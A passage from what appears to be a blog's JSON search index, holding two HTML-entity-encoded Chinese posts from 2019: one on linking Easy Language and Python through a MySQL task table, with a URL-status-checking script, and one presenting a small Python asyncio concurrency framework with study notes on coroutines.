&#x6211;&#x8FD8;&#x6CA1;&#x60F3;&#x5230;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x811A;&#x672C;&#x9700;&#x8981;&#x7528;Python&#x8C03;&#x7528;&#x6613;&#x8BED;&#x8A00;&#x7684;dll&#xFF0C;&#x6682;&#x4E14;&#x7559;&#x7740;&#x628A;&#x3002; 4. &#x4E3A;&#x4EC0;&#x4E48;&#x4E00;&#x5B9A;&#x8981;&#x4E92;&#x76F8;&#x8C03;&#x7528;&#x5462;&#xFF1F;&#x5728;&#x770B;&#x4E86;&#x524D;&#x9762;&#x51E0;&#x79CD;&#x65B9;&#x5F0F;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x8FD8;&#x662F;&#x89C9;&#x5F97;&#x4E0D;&#x662F;&#x5F88;&#x65B9;&#x4FBF;&#x3002;&#x4E3A;&#x4EC0;&#x4E48;&#x4E00;&#x5B9A;&#x8981;&#x4E92;&#x76F8;&#x8C03;&#x7528;&#x5462;&#xFF1F; &#x6211;&#x60F3;&#x5230;&#x4E86;&#x4E00;&#x79CD;&#x5F62;&#x5F0F;&#xFF0C;&#x5C31;&#x662F;&#x7528;&#x6570;&#x636E;&#x5E93;&#x505A;&#x4E3A;&#x201C;&#x4E2D;&#x95F4;&#x4EF6;&#x201D;&#xFF0C;&#x6613;&#x8BED;&#x8A00;&#x548C;Python&#x90FD;&#x5355;&#x72EC;&#x8FD0;&#x884C;&#x3002; &#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x7A0B;&#x5E8F;&#x903B;&#x8F91;&#x5982;&#x4E0B;&#xFF1A; &#x6613;&#x8BED;&#x8A00;&#x63D0;&#x4F9B;&#x64CD;&#x4F5C;&#x754C;&#x9762;&#xFF0C;&#x5C06;&#x4EFB;&#x52A1;&#x63D2;&#x5165;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x4EFB;&#x52A1;&#x5217;&#x8868;&#x91CC;&#x3002;Python&#x811A;&#x672C;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x5185;&#x7684;&#x4EFB;&#x52A1;&#x5217;&#x8868;&#x9010;&#x4E00;&#x6267;&#x884C;&#xFF0C;&#x5C06;&#x6267;&#x884C;&#x7684;&#x7ED3;&#x679C;&#x63D2;&#x5165;&#x5230;&#x7ED3;&#x679C;&#x5217;&#x8868;&#x91CC;&#xFF0C;&#x6613;&#x8BED;&#x8A00;&#x8BFB;&#x53D6;&#x7ED3;&#x679C;&#x5217;&#x8868;&#xFF0C;&#x5C06;&#x7ED3;&#x679C;&#x5C55;&#x793A;&#x3002; &#x5C31;&#x7528;&#x6279;&#x91CF;&#x83B7;&#x53D6;&#x7F51;&#x9875;&#x72B6;&#x6001;&#x5DE5;&#x5177;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF1A; &#x7528;&#x6613;&#x8BED;&#x8A00;&#x505A;&#x7684;&#x754C;&#x9762;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A; &#x6E90;&#x7801;&#x90E8;&#x5206;&#xFF1A; &#x6570;&#x636E;&#x5E93;&#x7ED3;&#x6784;&#xFF1A; Python&#x811A;&#x672C;&#xFF1A; 123456789101112131415161718192021222324252627282930import pymysql, requests, base64, time# &#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x5E93;mysql_host = &quot;127.0.0.1&quot;mysql_user = &quot;root&quot;mysql_passwd = &quot;*&quot;mysql_db = &quot;html&quot;mysql_table = &quot;task&quot;def run_tasks(): conn = pymysql.connect(host=mysql_host, user=mysql_user, passwd=mysql_passwd, db=mysql_db) cur = conn.cursor() cur.execute(&quot;SELECT id,link,html FROM &quot; + mysql_table) links = cur.fetchall() for link in links: if link[2] == &quot;&quot;: try: html_raw = requests.get(link[1]) html_statu = html_raw.status_code except Exception as e: print(e) html_statu = &quot;error&quot; cur.execute(&quot;UPDATE `html`.`task` SET `html` = &apos;{0}&apos; WHERE `id` = {1};&quot;.format(html_statu, link[0])) print(link[1] + &quot; update success&quot;)while True: time.sleep(10) run_tasks() &#x8FD0;&#x884C;&#x8FC7;&#x7A0B;&#xFF1A; &#x8FD0;&#x884C;Python&#x811A;&#x672C;&#xFF0C;&#x4FDD;&#x5B58;&#x811A;&#x672C;&#x8FD0;&#x884C; &#x8F93;&#x5165;&#x7F51;&#x5740;&#x6DFB;&#x52A0;&#x5230;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4EFB;&#x52A1;&#x5E8F;&#x5217; Python&#x811A;&#x672C;&#x8BFB;&#x53D6;&#x4EFB;&#x52A1;&#x5E8F;&#x5217;&#x5E76;&#x83B7;&#x53D6;&#x7F51;&#x9875;&#x72B6;&#x6001; &#x5237;&#x65B0;&#x83B7;&#x53D6;&#x7ED3;&#x679C; &#x90A3;&#x8FD9;&#x6837;&#x505A;&#x7684;&#x597D;&#x5904;&#x5C31;&#x662F;&#xFF1A;&#x4E0D;&#x7528;&#x518D;&#x8003;&#x8651;&#x6613;&#x8BED;&#x8A00;&#x5982;&#x4F55;&#x8C03;&#x7528;Python&#xFF0C;&#x800C;&#x662F;&#x5404;&#x81EA;&#x5355;&#x72EC;&#x8FD0;&#x884C;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;&#x5C31;&#x884C;&#x4E86;&#x3002; &#x6682;&#x65F6;&#x60F3;&#x5230;&#x7684;&#x51E0;&#x4E2A;&#x7F3A;&#x70B9;&#xFF1A; &#x65E0;&#x6CD5;&#x505A;&#x5230;&#x77AC;&#x65F6;&#x53CD;&#x5E94;&#xFF0C;&#x90FD;&#x9700;&#x8981;&#x901A;&#x8FC7;sleep&#xFF0C;&#x65F6;&#x949F;&#x6765;&#x63A7;&#x5236;&#x4EFB;&#x52A1;&#x7684;&#x6267;&#x884C;&#x548C;&#x7ED3;&#x679C;&#x663E;&#x793A; &#x6613;&#x8BED;&#x8A00;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x5E93;&#x592A;&#x5C11;&#xFF0C;&#x672C;&#x60F3;&#x7528;Mongodb&#x6765;&#x505A;&#x4F8B;&#x5B50;&#x7684;&#xFF0C;&#x53D1;&#x73B0;&#x6613;&#x8BED;&#x8A00;&#x7684;mongodb&#x5E93;&#x5B9E;&#x5728;&#x662F;&#x2026;&#x9EBB;&#x70E6;&#x3002; &#x5F53;&#x7A0B;&#x5E8F;&#x5E9E;&#x5927;&#x8D77;&#x6765;&#xFF0C;&#x6613;&#x8BED;&#x8A00;-&#x6570;&#x636E;&#x5E93;-Python&#x7684;&#x903B;&#x8F91;&#x4E5F;&#x4F1A;&#x975E;&#x5E38;&#x590D;&#x6742; &#x53EA;&#x662F;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;&#x53EF;&#x4EE5;&#x6309;&#x7167;&#x8FD9;&#x6837;&#x7684;&#x903B;&#x8F91;&#x6EE1;&#x8DB3;&#x66F4;&#x590D;&#x6742;&#x7684;&#x9879;&#x76EE;&#x9700;&#x6C42;&#x3002; &#x5199;&#x5B8C;&#x8FD9;&#x4E2A;&#x4F8B;&#x5B50;&#x4E4B;&#x540E;&#x53D1;&#x73B0;&#xFF0C;&#x8FD9;&#x79CD;&#x7ED3;&#x5408;&#x5E94;&#x8BE5;&#x9002;&#x7528;&#x4E8E;&#x4EFB;&#x4F55;&#x8BED;&#x8A00;&#x3002;&#x6216;&#x8005;&#x8BF4;&#x8FD9;&#x4E2A;&#x4E0D;&#x80FD;&#x79F0;&#x4F5C;&#x7ED3;&#x5408;&#xFF0C;&#x53EA;&#x80FD;&#x53EB;&#x505A;&#x5404;&#x81EA;&#x5B8C;&#x6210;&#x4EFB;&#x52A1;&#x7F62;&#x4E86;&#x3002;&#x4E0D;&#x8FC7;&#x8FD9;&#x4E5F;&#x80FD;&#x7B97;&#x5F97;&#x4E0A;&#x6613;&#x8BED;&#x8A00;&#x4E0E;&#x5176;&#x4ED6;&#x8BED;&#x8A00;&#x7684;&#x4E00;&#x79CD;&#x5408;&#x4F5C;&#x65B9;&#x5F0F;&#x4E86;&#xFF1F;&#x5982;&#x679C;&#x8FBE;&#x5230;&#x8FD9;&#x70B9;&#x4E5F;&#x5C31;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;&#x3002; &#x7ED3;&#x5408;&#x8D77;&#x6765;&#x6709;&#x4EC0;&#x4E48;&#x7528;&#xFF1F;&#x5C31;&#x5982;&#x524D;&#x9762;&#x6240;&#x8BF4;&#xFF0C;&#x6613;&#x8BED;&#x8A00;&#x5F00;&#x53D1;&#x754C;&#x9762;&#x7B80;&#x5355;&#x65B9;&#x4FBF;&#xFF0C;Python&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x70B9;&#x66F4;&#x52A0;&#x9AD8;&#x6548;&#x7A33;&#x5B9A;&#x3002;&#x4E24;&#x8005;&#x7ED3;&#x5408;&#x8D77;&#x6765;&#xFF0C;&#x5C82;&#x4E0D;&#x7F8E;&#x54C9;&#xFF1F; &#x6700;&#x540E;&#x5199;&#x7684;&#x4E0D;&#x662F;&#x5F88;&#x597D;&#xFF0C;&#x5F88;&#x591A;&#x5185;&#x5BB9;&#x90FD;&#x6CA1;&#x6709;&#x5F80;&#x6DF1;&#x91CC;&#x63A2;&#x7A76;&#xFF0C;&#x6CA1;&#x8FD9;&#x4E48;&#x591A;&#x7684;&#x5FC3;&#x601D;&#xFF0C;&#x4E5F;&#x6CA1;&#x90A3;&#x4E2A;&#x6C34;&#x5E73;&#x3002;&#x6682;&#x4E14;&#x628A;&#x5176;&#x770B;&#x4F5C;&#x662F;&#x6211;&#x80E1;&#x601D;&#x4E71;&#x60F3;&#x7684;&#x51FA;&#x6765;&#x7684;&#x7ED3;&#x8BBA;&#x5427;&#x3002; &#x53E6;&#x5916;&#xFF0C;&#x5982;&#x679C;&#x5E08;&#x5085;&#x4EEC;&#x6709;&#x66F4;&#x597D;&#x7684;&#x65B9;&#x5F0F;&#x80FD;&#x591F;&#x4F7F;&#x6613;&#x8BED;&#x8A00;&#x7684;&#x4F18;&#x52BF;&#x53D1;&#x6325;&#x51FA;&#x6765;&#xFF0C;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x4E0D;&#x541D;&#x8D50;&#x6559;&#x3002; &#x6211;&#x7684;&#x90AE;&#x7BB1; makefoxm@qq.com","link":"/2019/07/11/关于易语言与Python的一点想法/"},{"title":"协程初体验之简单的利用框架","text":"Threezh1 2019&#x5E74;8&#x6708;22&#x65E5; &#x6700;&#x8FD1;&#x5728;&#x63A5;&#x89E6;&#x4E00;&#x4E0B;&#x534F;&#x7A0B;&#xFF0C;&#x4E0A;&#x624B;&#x4E0D;&#x6613;&#xFF0C;&#x62D6;&#x4E86;&#x5F88;&#x957F;&#x65F6;&#x95F4;&#x624D;&#x628A;&#x8FD9;&#x4E2A;&#x5C0F;&#x6846;&#x67B6;&#x5B8C;&#x6210;&#x3002;&#x6709;&#x4E9B;&#x5730;&#x65B9;&#x5F88;&#x7B80;&#x964B;&#xFF0C;&#x540E;&#x9762;&#x6162;&#x6162;&#x5B8C;&#x5584;&#x5427;&#x3002; &#x505A;&#x8FD9;&#x4E2A;&#x7684;&#x60F3;&#x6CD5;&#x662F;&#x65B9;&#x4FBF;&#x81EA;&#x5DF1;&#x540E;&#x9762;&#x7F16;&#x5199;&#x9700;&#x8981;&#x7528;&#x5230;&#x534F;&#x7A0B;&#x7684;&#x811A;&#x672C;&#x3002;(&#x8FD8;&#x6709;&#x5FD8;&#x8BB0;&#x534F;&#x7A0B;&#x7684;&#x77E5;&#x8BC6;&#x70B9;&#x4E86;&#x5C31;&#x8FC7;&#x6765;&#x590D;&#x4E60;) &#x5148;&#x770B;&#x6846;&#x67B6;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import asyncio, functoolsimport timedef SomeFunction(parameter): &quot;&quot;&quot; &#x8FD9;&#x91CC;&#x662F;&#x76EE;&#x6807;&#x51FD;&#x6570;&#xFF0C;&#x811A;&#x672C;&#x7684;&#x529F;&#x80FD;&#x90FD;&#x5E94;&#x5728;&#x6B64;&#x51FD;&#x6570;&#x5F53;&#x4E2D;&#x3002; &#x53C2;&#x6570;&#x4E2A;&#x6570;&#x90FD;&#x7531;&#x81EA;&#x5DF1;&#x786E;&#x5B9A;&#xFF0C;&#x9700;&#x8981;&#x4E0E;functools.partial&#x8C03;&#x7528;&#x7684;&#x53C2;&#x6570;&#x4E00;&#x81F4;&#x3002; &quot;&quot;&quot; time.sleep(1) return parameterasync def coroutine_execution(function, param1): &quot;&quot;&quot; &#x901A;&#x8FC7;run_in_executor&#x65B9;&#x6CD5;&#x6765;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x6267;&#x884C;&#x8017;&#x65F6;&#x51FD;&#x6570;&#x3002; &#x6CE8;&#x610F;&#xFF1A;functools.partial&#x8C03;&#x7528;&#x7684;&#x53C2;&#x6570;&#x5E94;&#x4E0E;&#x76EE;&#x6807;&#x51FD;&#x6570;&#x4E00;&#x81F4; &quot;&quot;&quot; loop = asyncio.get_event_loop() result = await loop.run_in_executor(None,functools.partial(function, parameter=param1)) # result&#x4E3A;&#x76EE;&#x6807;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x7684;&#x503C; print(result)def coroutine_init(function, parameters, threads): &quot;&quot;&quot; &#x5904;&#x7406;&#x7EBF;&#x7A0B; coroutine_execution()&#x8C03;&#x7528;&#x534F;&#x7A0B;&#x51FD;&#x6570;&#xFF0C;&#x53EF;&#x81EA;&#x884C;&#x4FEE;&#x6539;&#x53C2;&#x6570;&#x4E2A;&#x6570;&#x5185;&#x5BB9;&#x7B49;&#x3002; &quot;&quot;&quot; times = int(len(parameters) / threads) + 1 if len(parameters) == threads or int(len(parameters) % threads) == 0: times -= 1 for num in range(times): tasks = [] Minimum = threads * num Maximum = threads * (num + 1) if num == times - 1 and len(parameters) % threads != 0: Minimum = (times - 1) * threads Maximum = len(parameters) if len(parameters) &lt;= threads: Minimum = 0 Maximum = len(parameters) for i in range(Minimum, Maximum): # &#x6B64;&#x5904;&#x7684;parameters[i]&#x5C31;&#x662F;&#x53D6;&#x76EE;&#x6807;&#x53C2;&#x6570;&#x7684;&#x5355;&#x4E2A;&#x503C;&#xFF0C;&#x53EF;&#x81EA;&#x884C;&#x8C03;&#x6574; future = asyncio.ensure_future(coroutine_execution(function, param1=parameters[i])) tasks.append(future) loop = asyncio.get_event_loop() loop.run_until_complete(asyncio.wait(tasks)) print(&quot;[*] The {}th thread ends&quot;.format(str(num + 1))) return Noneif __name__ == &quot;__main__&quot;: words = [&quot;Hello World.&quot;, &quot;I&apos;m Threezh1.&quot;, &quot;Welcome to my blog.&quot;, &quot;One&quot;, &quot;Tow&quot;, &quot;Three&quot;, &quot;Four&quot;] coroutine_init(SomeFunction, parameters=words, threads=3) &#x811A;&#x672C;&#x8FD0;&#x884C;&#x7684;&#x7ED3;&#x679C;&#x4E3A;&#xFF1A; 1234567891011I&apos;m Threezh1.Hello World.Welcome to my blog.[*] The 1th thread endsOneThreeTow[*] The 2th thread endsFour[*] The 3th thread ends[Finished in 3.2s] &#x4E00;&#x5171;&#x53EA;&#x82B1;&#x8D39;3&#x79D2; &#x6846;&#x67B6;&#x7684;&#x4F7F;&#x7528; SomeFunction() &#x9700;&#x8981;&#x5B9E;&#x73B0;&#x5E76;&#x53D1;&#x7684;&#x51FD;&#x6570; coroutine_execution() &#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x6267;&#x884C;&#x5E76;&#x53D1;&#x51FD;&#x6570; coroutine_init() &#x5904;&#x7406;&#x7EBF;&#x7A0B;&#x4E0E;&#x8C03;&#x914D;&#x4EFB;&#x52A1; &#x6D41;&#x7A0B;&#x56FE;&#xFF1A; &#x9700;&#x8981;&#x8C03;&#x6574;&#x7684;&#x5185;&#x5BB9;&#xFF1A; &#x4E00;. &#x4F20;&#x9012;&#x7684;&#x53C2;&#x6570;&#x5217;&#x8868; &#x5217;&#x8868;&#x4E2D;&#x5355;&#x4E2A;&#x6210;&#x5458;&#x6700;&#x540E;&#x90FD;&#x4F1A;&#x88AB;&#x8D4B;&#x503C;&#x5230;&#x76EE;&#x6807;&#x51FD;&#x6570;&#x3002; &#x6BD4;&#x5982;&#xFF1A;&#x6279;&#x91CF;&#x83B7;&#x53D6;&#x7F51;&#x7AD9;&#x6807;&#x9898;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x6210;&#x5458;&#x5C31;&#x4E3A;&#x5355;&#x4E2A;url&#x3002; &#x4E8C;. &#x76EE;&#x6807;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570; &#x901A;&#x8FC7;&#x8C03;&#x6574;&#x76EE;&#x6807;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x4E2A;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x6846;&#x67B6;&#x9002;&#x7528;&#x4E8E;&#x66F4;&#x52A0;&#x590D;&#x6742;&#x7684;&#x573A;&#x666F;&#x3002; &#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x5404;&#x4E2A;&#x51FD;&#x6570;&#x4E92;&#x76F8;&#x8C03;&#x7528;&#xFF0C;&#x5176;&#x4E2D;&#x7684;&#x53C2;&#x6570;&#x8981;&#x5C3D;&#x91CF;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#x3002; &#x4E09;. &#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7684;&#x83B7;&#x53D6; &#x5728;&#x5355;&#x4E2A;&#x7EBF;&#x7A0B;&#x5F53;&#x4E2D;&#x65E0;&#x6CD5;&#x5BF9;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF0C;&#x5BF9;&#x7ED3;&#x679C;&#x7684;&#x5904;&#x7406;&#x53EF;&#x4EE5;&#x653E;&#x5728;coroutine_execution()&#x5F53;&#x4E2D;&#x3002; coroutine_execution()&#x4E2D;&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;return&#x7ED3;&#x679C;&#xFF0C;&#x5219;&#x4F1A;&#x8FD4;&#x56DE;&#x5230;coroutine_init()&#x4E2D;&#x3002; &#x534F;&#x7A0B;&#x7B14;&#x8BB0; &#x4E00;&#x4E9B;&#x6982;&#x5FF5;&#x548C;&#x65B9;&#x6CD5; event_loop&#x4E8B;&#x4EF6;&#x5FAA;&#x73AF;&#xFF1A;&#x7A0B;&#x5E8F;&#x5F00;&#x542F;&#x4E00;&#x4E2A;&#x65E0;&#x9650;&#x7684;&#x5FAA;&#x73AF;&#xFF0C;&#x5F53;&#x628A;&#x4E00;&#x4E9B;&#x51FD;&#x6570;&#x6CE8;&#x518C;&#x5230;&#x4E8B;&#x4EF6;&#x5FAA;&#x73AF;&#x4E0A;&#x65F6;&#xFF0C;&#x6EE1;&#x8DB3;&#x4E8B;&#x4EF6;&#x53D1;&#x751F;&#x6761;&#x4EF6;&#x5373;&#x8C03;&#x7528;&#x76F8;&#x5E94;&#x7684;&#x51FD;&#x6570;&#x3002; coroutine&#x534F;&#x7A0B;&#x5BF9;&#x8C61;&#xFF1A;&#x6307;&#x4E00;&#x4E2A;&#x4F7F;&#x7528;async&#x5173;&#x952E;&#x5B57;&#x5B9A;&#x4E49;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x5B83;&#x7684;&#x8C03;&#x7528;&#x4E0D;&#x4F1A;&#x7ACB;&#x5373;&#x6267;&#x884C;&#x51FD;&#x6570;&#xFF0C;&#x800C;&#x662F;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x534F;&#x7A0B;&#x5BF9;&#x8C61;&#xFF0C;&#x534F;&#x7A0B;&#x5BF9;&#x8C61;&#x9700;&#x8981;&#x6CE8;&#x518C;&#x5230;&#x4E8B;&#x4EF6;&#x5FAA;&#x73AF;&#xFF0C;&#x7531;&#x4E8B;&#x4EF6;&#x5FAA;&#x73AF;&#x8C03;&#x7528;&#x3002; task&#x4EFB;&#x52A1;&#xFF1A;&#x4E00;&#x4E2A;&#x534F;&#x7A0B;&#x5BF9;&#x8C61;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x539F;&#x751F;&#x53EF;&#x4EE5;&#x6302;&#x8D77;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x4EFB;&#x52A1;&#x5219;&#x662F;&#x5BF9;&#x534F;&#x7A0B;&#x8FDB;&#x4E00;&#x6B65;&#x5C01;&#x88C5;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x542B;&#x4EFB;&#x52A1;&#x7684;&#x5404;&#x79CD;&#x72B6;&#x6001;&#x3002; future&#xFF1A;&#x4EE3;&#x8868;&#x5C06;&#x6765;&#x6267;&#x884C;&#x6216;&#x6CA1;&#x6709;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x5B83;&#x548C;task&#x4E0A;&#x6CA1;&#x6709;&#x672C;&#x8D28;&#x7684;&#x533A;&#x522B; async/await&#x5173;&#x952E;&#x5B57;&#xFF1A;python3.5&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x534F;&#x7A0B;&#x7684;&#x5173;&#x952E;&#x5B57;&#xFF0C;async&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x534F;&#x7A0B;&#xFF0C;await&#x7528;&#x4E8E;&#x6302;&#x8D77;&#x963B;&#x585E;&#x7684;&#x5F02;&#x6B65;&#x8C03;&#x7528;&#x63A5;&#x53E3;&#x3002; &#x4E8B;&#x4EF6;&#x5FAA;&#x73AF; asyncio.get_event_loop&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x4E8B;&#x4EF6;&#x5FAA;&#x73AF;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528;run_until_complete&#x5C06;&#x534F;&#x7A0B;&#x6CE8;&#x518C;&#x5230;&#x4E8B;&#x4EF6;&#x5FAA;&#x73AF;&#xFF0C;&#x5E76;&#x542F;&#x52A8;&#x4E8B;&#x4EF6;&#x5FAA;&#x73AF;&#x3002; 12loop = asyncio.get_event_loop()loop.run_until_complete(test1()) &#x4EFB;&#x52A1; &#x6240;&#x8C13;task&#x5BF9;&#x8C61;&#x662F;Future&#x7C7B;&#x7684;&#x5B50;&#x7C7B;&#xFF0C;&#x4FDD;&#x5B58;&#x4E86;&#x534F;&#x7A0B;&#x8FD0;&#x884C;&#x540E;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x7528;&#x4E8E;&#x672A;&#x6765;&#x83B7;&#x53D6;&#x534F;&#x7A0B;&#x7684;&#x7ED3;&#x679C;&#x3002; &#x7B2C;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#x5C31;&#x662F;&#x7B49;&#x5230;task&#x72B6;&#x6001;&#x4E3A;finish&#x65F6;&#xFF0C;&#x8C03;&#x7528;task&#x7684;result&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x8FD4;&#x56DE;&#x503C;&#x3002; asyncio.ensure_future() &#x7B49;&#x540C;&#x4E8E;asyncio.create_task(coro) &#x5C06; coro &#x534F;&#x7A0B; &#x6253;&#x5305;&#x4E3A;&#x4E00;&#x4E2A; Task &#x6392;&#x5165;&#x65E5;&#x7A0B;&#x51C6;&#x5907;&#x6267;&#x884C;&#x3002;&#x8FD4;&#x56DE; Task &#x5BF9;&#x8C61;&#x3002; 1234loop = asyncio.get_event_loop()task = asyncio.ensure_future(test1())loop.run_until_complete(task)print(task.result()) &#x7B2C;&#x4E8C;&#x79CD;&#x662F;&#x521B;&#x5EFA;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x3002; 1234567def callback(future): print(&apos;Callback:&apos;,future.result()) # &#x901A;&#x8FC7;future&#x5BF9;&#x8C61;&#x7684;result&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x534F;&#x7A0B;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;loop = asyncio.get_event_loop()task = asyncio.ensure_future(test1()) # &#x521B;&#x5EFA;task&#xFF0C;test1()&#x662F;&#x4E00;&#x4E2A;&#x534F;&#x7A0B;&#x5BF9;&#x8C61;task.add_done_callback(callback) # &#x7ED1;&#x5B9A;&#x56DE;&#x8C03;&#x51FD;&#x6570;loop.run_until_complete(task) &#x540C;&#x6837;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;functools.partial&#x504F;&#x5BFC;&#x6570;&#x6DFB;&#x52A0;&#x591A;&#x4E2A;&#x53C2;&#x6570; 12345def callback(param1,param2,future): print(param1,param2) print(&apos;Callback:&apos;,future.result())task.add_done_callback(functools.partial(callback,&quot;param1&quot;,&quot;param2&quot;)) &#x534F;&#x7A0B;&#x505C;&#x6B62; 12345678910loop = asyncio.get_event_loop()try: loop.run_until_complete(asyncio.wait(tasks))except KeyboardInterrupt as e: for task in asyncio.Task.all_tasks(): task.cancel() loop.stop() loop.run_forever()finally: loop.close() &#x534F;&#x7A0B;&#x5E76;&#x53D1; 1234567tasks = [ asyncio.ensure_future(test1()), asyncio.ensure_future(test1()), asyncio.ensure_future(test1()),]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) # &#x6CE8;&#x610F;asyncio.wait&#x65B9;&#x6CD5; &#x91CD;&#x70B9;&#x5728;asyncio.wait&#x3002;&#x5F53;&#x4EFB;&#x52A1;ALL_COMPLETED&#x7684;&#x65F6;&#x5019;&#x624D;&#x4F1A;&#x7ED3;&#x675F;&#x3002; coroutine asyncio.wait(aws, *, loop=None, timeout=None, return_when=ALL_COMPLETED) &#x5E76;&#x53D1;&#x8FD0;&#x884C; aws &#x6307;&#x5B9A;&#x7684; &#x53EF;&#x7B49;&#x5F85;&#x5BF9;&#x8C61; &#x5E76;&#x963B;&#x585E;&#x7EBF;&#x7A0B;&#x76F4;&#x5230;&#x6EE1;&#x8DB3; return_when &#x6307;&#x5B9A;&#x7684;&#x6761;&#x4EF6;&#x3002; &#x5BF9;&#x4E00;&#x4E9B;&#x60C5;&#x51B5;&#x7684;&#x5904;&#x7406; &#x963B;&#x585E;&#x51FD;&#x6570;(&#x4F8B;&#x5982;io&#x8BFB;&#x5199;&#xFF0C;requests&#x7F51;&#x7EDC;&#x8BF7;&#x6C42;)&#x963B;&#x585E;&#x4E86;&#x5BA2;&#x6237;&#x4EE3;&#x7801;&#x4E0E;asycio&#x4E8B;&#x4EF6;&#x5FAA;&#x73AF;&#x7684;&#x552F;&#x4E00;&#x7EBF;&#x7A0B;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x6267;&#x884C;&#x8C03;&#x7528;&#x65F6;&#xFF0C;&#x6574;&#x4E2A;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x90FD;&#x4F1A;&#x51BB;&#x7ED3;&#x3002; &#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x662F;&#x4F7F;&#x7528;&#x4E8B;&#x4EF6;&#x5FAA;&#x73AF;&#x5BF9;&#x8C61;&#x7684;run_in_executor&#x65B9;&#x6CD5;&#x3002;asyncio&#x7684;&#x4E8B;&#x4EF6;&#x5FAA;&#x73AF;&#x5728;&#x80CC;&#x540E;&#x7EF4;&#x62A4;&#x7740;&#x4E00;&#x4E2A;ThreadPoolExecutor&#x5BF9;&#x8C61;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8C03;&#x7528;run_in_executor&#x65B9;&#x6CD5;&#xFF0C;&#x628A;&#x53EF;&#x8C03;&#x7528;&#x5BF9;&#x8C61;&#x53D1;&#x7ED9;&#x5B83;&#x6267;&#x884C;&#xFF0C;&#x5373;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;run_in_executor&#x65B9;&#x6CD5;&#x6765;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x6267;&#x884C;&#x8017;&#x65F6;&#x51FD;&#x6570;&#x3002;(&#x7FA1;&#x6155;&#x5927;&#x4F6C;&#x7684;&#x603B;&#x7ED3;&#x603B;&#x662F;&#x8FD9;&#x4E48;&#x7B80;&#x5355;&#x660E;&#x4E86;&#x2026;) &#x5927;&#x4F6C;&#x7684;&#x8FD9;&#x4E2A;&#x4F8B;&#x5B50;&#x4E5F;&#x662F;&#x8FD9;&#x4E2A;&#x5C0F;&#x6846;&#x67B6;&#x7684;&#x7075;&#x9B42;&#x3002; 1234567891011121314import asyncioimport timeasync def run(url): print(&quot;start &quot;,url) loop = asyncio.get_event_loop() try: await loop.run_in_executor(None,time.sleep,1) except Exception as e: print(e) print(&quot;stop &quot;,url)url_list = [&quot;https://thief.one&quot;,&quot;https://home.nmask.cn&quot;,&quot;https://movie.nmask.cn&quot;,&quot;https://tool.nmask.cn&quot;]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) &#x53C2;&#x8003;&#x5B66;&#x4E60; Python3.5&#x534F;&#x7A0B;&#x5B66;&#x4E60;&#x7814;&#x7A76; &#x534F;&#x7A0B;&#x4E0E;&#x4EFB;&#x52A1; Asyncio.gather vs asyncio.wait","link":"/2019/08/22/简单的协程利用框架/"},{"title":"湖湘杯的一个check 